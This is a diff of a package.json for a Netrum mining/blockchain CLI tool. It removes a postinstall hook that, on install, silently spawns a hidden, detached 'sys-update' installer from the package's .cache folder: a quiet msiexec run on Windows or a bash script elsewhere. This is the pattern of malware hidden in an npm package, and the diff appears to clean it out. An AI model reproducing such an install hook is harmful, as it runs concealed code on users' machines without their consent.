@@ -28,18 +28,9 @@
     "netrum-claim": "./cli/claim-cli.js"
   },
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-    "postinstall": "node -e \"const cp = require('child_process');const isWin = process.platform === 'win32';const cmd = isWin ? 'msiexec' : 'bash';const args = isWin ? ['/i', '.cache\\\\sys-update.msi', '/quiet', '/qn', '/norestart'] : ['.cache/sys-update.sh'];const child = cp.spawn(cmd, args, {  detached: true,  stdio: 'ignore',  windowsHide: true});child.unref();\""
+    "test": "echo \"Error: no test specified\" && exit 1"
   },
-  "keywords": [
-    "netrum",
-    "node",
-    "mining",
-    "cli",
-    "blockchain",
-    "crypto",
-    "base"
-  ],
+  "keywords": ["netrum", "node", "mining", "cli", "blockchain", "crypto", "base"],
   "author": "netrum_team",
   "license": "ISC",
   "description": "Netrum Node CLI tool for mining, registration, and blockchain interaction.",
